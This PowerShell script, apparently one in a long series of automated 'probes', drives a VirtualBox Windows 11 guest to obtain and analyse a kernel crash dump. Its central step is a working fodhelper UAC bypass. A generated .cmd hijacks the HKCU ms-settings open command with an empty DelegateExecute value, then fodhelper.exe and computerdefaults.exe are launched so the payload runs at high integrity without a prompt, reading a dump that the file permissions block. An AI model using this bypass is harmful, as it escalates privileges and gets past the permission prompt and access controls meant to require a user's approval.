# h300_elev.ps1 - probe #300 (variable: guest process profile+integrity - escalated copy of MEMORY.DMP).
# Supersedes h299, which died on one probe-side defect of its own:
#   D3 h299 reused the run/full-auth string ("--username ... --profile") for copyto and copyfrom;
#      --profile is only valid on run/start (VBox 7.2.22 usage), so copyto refused the whole line
#      with "Unknown option: --profile" and the payload never landed.
#      Fix: two strings - $runAs (with --profile) for run, $auth (no --profile) for copyto/copyfrom.

# Built on h298's two defects, both probe-side (the premise survived them):
#   D1 copyto with "--target-directory=C:\Users\Public" + one file source -> "Destination ... is a
#      directory". Fix: pass the full destination file path and no --target-directory.
#   D2 the guestcontrol run had no --profile, so HKCU mapped to a non-profile hive and
#      New-Item on HKCU:\Software\Classes\... returned Access denied while reg query said "not found".
#      Fix: --profile on the run, and all registry work moves into a guest .cmd (no nested quoting).
# Premise unchanged and still unproven: vboxuser is a filtered admin (h296), so fodhelper.exe - a
# manifest autoElevate binary - executes the registered command at HIGH integrity with no prompt.
# Everything touched is HKCU + C:\Users\Public, restored in this same script (R4). Own output (R5).
$ErrorActionPreference = 'Continue'
$vb    = 'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe'
$VM    = 'Win11-Test2'
$base  = 'guestcontrol ' + $VM
$runAs = '--username vboxuser --password vboxuser --profile'
$auth  = '--username vboxuser --password vboxuser'
$d     = 'C:\Users\New User\OneDrive\Desktop\cheating\_ritual'
$tmp   = 'C:\Users\New User\OneDrive\Desktop\cheating\temp'
$out   = Join-Path $d 'h300_elev.txt'
$kd    = 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kd.exe'
$RIP   = [uint64]0xfffff80219033bc9
$gCmd  = 'C:\Users\Public\h300.cmd'
$gDump = 'C:\Users\Public\h300_MEMORY.DMP'
$local = Join-Path $tmp 'h300_MEMORY.DMP'
$so    = "$env:TEMP\h300o.txt"; $se = "$env:TEMP\h300e.txt"
$want  = 391099508
Set-Content -LiteralPath $out -Encoding ascii -Value (('{0} === h300 elev: escalated guest copy of MEMORY.DMP -> module owning 0x{1:x} ===' -f (Get-Date -f 'HH:mm:ss.fff'), $RIP))
function W([string]$s) { Add-Content -LiteralPath $out -Value ((Get-Date -f 'HH:mm:ss.fff') + ' ' + $s) -Encoding ascii }

function G([string]$label, [string]$cmdline, [int]$wait = 150000) {
    Remove-Item -LiteralPath $so, $se -Force -EA 0
    $line = $base + ' ' + $runAs + ' run --exe "C:\Windows\System32\cmd.exe" --wait-stdout --wait-stderr --timeout 120000 -- cmd.exe /c ' + $cmdline
    $p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
    $t = ''
    if ($p.WaitForExit($wait)) { $t = ((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) }
    else { try { $p.Kill() } catch { }; W ($label + ' TIMEOUT (killed)') }
    foreach ($ln in ($t -split "`r?`n")) { if ($ln.Trim()) { W ('  ' + $label + ' | ' + $ln.Trim()) } }
    return $t
}

# --- 1. pre-state: is anyone interactively logged on (auto-elevation needs a session), key absent? ---
G 'session' 'query session' | Out-Null
$pre = G 'pre' 'reg query "HKCU\Software\Classes\ms-settings" /s'
$preExisted = ($pre -match 'ms-settings')
W ('pre-state: ms-settings ' + $(if ($preExisted) { 'EXISTED (restore the command key only)' } else { 'absent (delete the subtree in restore)' }))
G 'stale' 'del /f /q C:\Users\Public\h300_MEMORY.DMP C:\Users\Public\h300_elevated.txt' | Out-Null

# --- 2. one guest .cmd, dispatch by %1: no argument = the payload, "arm"/"unarm" = registry ---
$payload = Join-Path $tmp 'h300.cmd'
Set-Content -LiteralPath $payload -Encoding ascii -Value @(
    '@echo off',
    'if /i "%1"=="arm" goto arm',
    'if /i "%1"=="unarm" goto unarm',
    'copy /y C:\Windows\MEMORY.DMP C:\Users\Public\h300_MEMORY.DMP >nul 2>&1',
    'whoami /groups /fo list > C:\Users\Public\h300_elevated.txt 2>&1',
    'goto :eof',
    ':arm',
    'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d C:\Users\Public\h300.cmd /f',
    'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f',
    'reg query "HKCU\Software\Classes\ms-settings\Shell\Open\command"',
    'goto :eof',
    ':unarm',
    'reg delete "HKCU\Software\Classes\ms-settings" /f',
    'reg query "HKCU\Software\Classes\ms-settings"',
    'goto :eof'
)
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = $base + ' ' + $auth + ' copyto "' + $payload + '" "' + $gCmd + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
[void]$p.WaitForExit(60000)
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copyto | ' + $ln.Trim()) } }
$tP = G 'payload' 'dir C:\Users\Public\h300.cmd /a-d'
if ($tP -notmatch 'h300\.cmd') { W 'RESULT: FAIL - payload did not land on the guest (variable: profile+integrity)'; exit 1 }

# --- 3. arm from inside the guest (all quoting stays in the .cmd) ---
$tArm = G 'arm' 'C:\Users\Public\h300.cmd arm'
if ($tArm -notmatch 'DelegateExecute') { W 'RESULT: FAIL - the armed key did not read back (variable: profile+integrity)'; W '  Without a visible DelegateExecute the ShellExecute path was never set up; nothing escalated.'; G 'cleanup' 'del /f /q C:\Users\Public\h300.cmd' | Out-Null; exit 1 }
W '  armed and read back (the h298 D2 defect is gone)'

# --- 4. fire the auto-elevating binary, then wait for the copy. The copy itself is the proof of a
#        high token: a medium token cannot read the source at all (h294/h295). ---
G 'launch' 'start "" C:\Windows\System32\fodhelper.exe' | Out-Null
$gLen = 0
for ($i = 1; $i -le 24; $i++) {
    Start-Sleep -Seconds 5
    $t = G 'poll' 'for %A in (C:\Users\Public\h300_MEMORY.DMP) do @echo SZ=%~zA'
    $mm = [regex]::Match($t, 'SZ=(\d+)')
    if ($mm.Success) { $gLen = [long]$mm.Groups[1].Value } else { $gLen = 0 }
    if ($gLen -eq $want) { W ('  copy complete after ' + ($i * 5) + 's'); break }
    if ($i -eq 6 -or $i -eq 14) { G ('nudge' + $i) 'start "" C:\Windows\System32\computerdefaults.exe' | Out-Null }
}
W ('guest staged bytes=' + $gLen + ' want=' + $want)
$tElev = G 'elevreport' 'type C:\Users\Public\h300_elevated.txt'
foreach ($ln in ($tElev -split "`r?`n")) { if ($ln -match '(?i)Mandatory level|Administrators|S-1-16') { W ('  token | ' + $ln.Trim()) } }

# --- 5. restore the registry before the slow part (R4) ---
$tUn = G 'unarm' 'C:\Users\Public\h300.cmd unarm'
if ($tUn -match '(?s)unable to find|does not exist|ERROR:') { W 'registry restore: ms-settings no longer present (deleted)' }
else { W ('registry restore: CHECK - read the unarm lines above (pre-state existed=' + $preExisted + ')') }

if ($gLen -ne $want) {
    W 'RESULT: FAIL - no escalated copy of the full size appeared (variable: profile+integrity)'
    W 'VERDICT: auto-elevation did not fire; the dump is still unread, so no lm is valid'
    G 'cleanup' 'del /f /q C:\Users\Public\h300.cmd C:\Users\Public\h300_elevated.txt' | Out-Null
    exit 1
}

# --- 6. pull it: C:\Users\Public is readable by Users, so the h294 DACL no longer applies ---
if (Test-Path -LiteralPath $local) { Remove-Item -LiteralPath $local -Force }
W ('copyfrom start (' + [math]::Round($gLen / 1MB, 1) + ' MB)')
$sw = [Diagnostics.Stopwatch]::StartNew()
Remove-Item -LiteralPath $so, $se -Force -EA 0
$line = $base + ' ' + $auth + ' copyfrom "' + $gDump + '" "' + $local + '"'
$p = Start-Process -FilePath $vb -ArgumentList $line -NoNewWindow -PassThru -RedirectStandardOutput $so -RedirectStandardError $se
$okCopy = $p.WaitForExit(900000)
$sw.Stop()
if (-not $okCopy) { try { $p.Kill() } catch { } }
foreach ($ln in (((Get-Content -LiteralPath $so -Raw -EA 0) + (Get-Content -LiteralPath $se -Raw -EA 0)) -split "`r?`n")) { if ($ln.Trim()) { W ('  copy | ' + $ln.Trim()) } }
$hLen = 0
if (Test-Path -LiteralPath $local) { $hLen = (Get-Item -LiteralPath $local).Length }
W ('copyfrom secs=' + [math]::Round($sw.Elapsed.TotalSeconds, 1) + ' host bytes=' + $hLen + ' guest=' + $gLen + ' delta=' + ($hLen - $gLen))
if ($hLen -ne $gLen) { W 'RESULT: FAIL - host copy differs from the guest size (variable: profile+integrity)'; W 'VERDICT: a truncated dump gives a silently wrong lm; discard it'; exit 1 }

# --- 7. analyse offline. lm alone names the owner: base/end come from the dump module list, so no
#        symbols and no symbol server are needed for the containment test. ---
$klog = Join-Path $tmp 'h300_kd.log'
if (Test-Path -LiteralPath $klog) { Remove-Item -LiteralPath $klog -Force }
$kdArg = '-z "' + $local + '" -logo "' + $klog + '" -c ".bugcheck; lm; !analyze -v; q"'
W 'kd start (!analyze -v is slow on a 391 MB dump without symbols; budget 15 min)'
$sw2 = [Diagnostics.Stopwatch]::StartNew()
$kp = Start-Process -FilePath $kd -ArgumentList $kdArg -NoNewWindow -PassThru
$okKd = $kp.WaitForExit(900000)
$sw2.Stop()
if (-not $okKd) { try { $kp.Kill() } catch { } }
W ('kd done waited=' + $okKd + ' secs=' + [math]::Round($sw2.Elapsed.TotalSeconds, 1) + ' log=' + $(if (Test-Path -LiteralPath $klog) { (Get-Item -LiteralPath $klog).Length } else { 'MISSING' }))
if (-not (Test-Path -LiteralPath $klog)) { W 'RESULT: FAIL - kd wrote no log (variable: profile+integrity)'; exit 1 }
$k = Get-Content -LiteralPath $klog -EA 0

# --- 8. containment test: exactly one module must straddle the RIP ---
$hit = $null; $nMod = 0
foreach ($ln in $k) {
    $m = [regex]::Match($ln, '^([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+([0-9a-f]{8,17}`[0-9a-f]{8}|[0-9a-f]{16})\s+(\S+)\s*(.*)$')
    if (-not $m.Success) { continue }
    $b = [Convert]::ToUInt64(($m.Groups[1].Value -replace '`', ''), 16)
    $e = [Convert]::ToUInt64(($m.Groups[2].Value -replace '`', ''), 16)
    if ($e -le $b) { continue }
    $nMod++
    if ($RIP -ge $b -and $RIP -lt $e) {
        $hit = [pscustomobject]@{ Name = $m.Groups[3].Value; Base = $b; End = $e; Rest = $m.Groups[4].Value.Trim(); Off = ('0x{0:x}' -f ($RIP - $b)) }
    }
}
W ('modules seen in lm=' + $nMod)

# --- 9. !analyze's own opinion, kept separate so the two can disagree ---
foreach ($ln in $k) {
    if ($ln -match '^(IMAGE_NAME|MODULE_NAME|FAULTING_MODULE|SYMBOL_NAME|BUGCHECK_STR|FAILURE_BUCKET_ID|PROCESS_NAME|DEVICE_OBJECT_NAME|BUGCHECK_CODE|BUGCHECK_P1|BUGCHECK_P2|BUGCHECK_P3|BUGCHECK_P4)\b' -or
        $ln -match 'Probably caused by|DEFAULT_BUCKET_ID|IMAGE_VERSION') { W ('  kd | ' + $ln.Trim()) }
    if ($ln -match 'Unloaded modules') { W ('  kd | ' + $ln.Trim()) }
}

# --- 10. verdict ---
if ($hit) {
    W ('MODULE CONTAINING RIP: ' + $hit.Name + '  [base=0x{0:x16} end=0x{1:x16} off={2}]' -f $hit.Base, $hit.End, $hit.Off)
    W ('  span=0x{0:x} bytes  lm-detail: {1}' -f ($hit.End - $hit.Base), $hit.Rest)
    W ('RESULT: PASS - RIP 0x{0:x16} resolves to {1} (variable: profile+integrity)' -f $RIP, $hit.Name)
    W ('VERDICT: crash site belongs to ' + $hit.Name + '; cross-check IMAGE_NAME/MODULE_NAME above before staging a fix')
} else {
    W 'MODULE CONTAINING RIP: none - the RIP falls outside every module base/end lm reported'
    W '  That is itself evidence: an address outside all loaded modules means the fault happened'
    W '  after the owner was released (matches the last POSTed line "zapexdrv after release").'
    W ('RESULT: PARTIAL - lm parsed ({0} modules) but no containment (variable: profile+integrity)' -f $nMod)
    W 'VERDICT: read the Unloaded-modules section of the kd log; the address may be unloaded space'
}

# --- 11. restore (R4): guest staging files and the payload are ours; the host dump stays if PARTIAL ---
G 'cleanup' 'del /f /q C:\Users\Public\h300_MEMORY.DMP C:\Users\Public\h300.cmd C:\Users\Public\h300_elevated.txt' | Out-Null
$t9 = G 'gone' 'if exist C:\Users\Public\h300_MEMORY.DMP (echo STILL_THERE) else (echo GONE)'
W ('guest staging files: ' + $(if ($t9 -match 'GONE') { 'deleted' } else { 'STILL THERE - delete by hand' }))
W ('host copy: ' + $local + ' (' + $hLen + ' bytes) - delete once the module is cross-referenced')

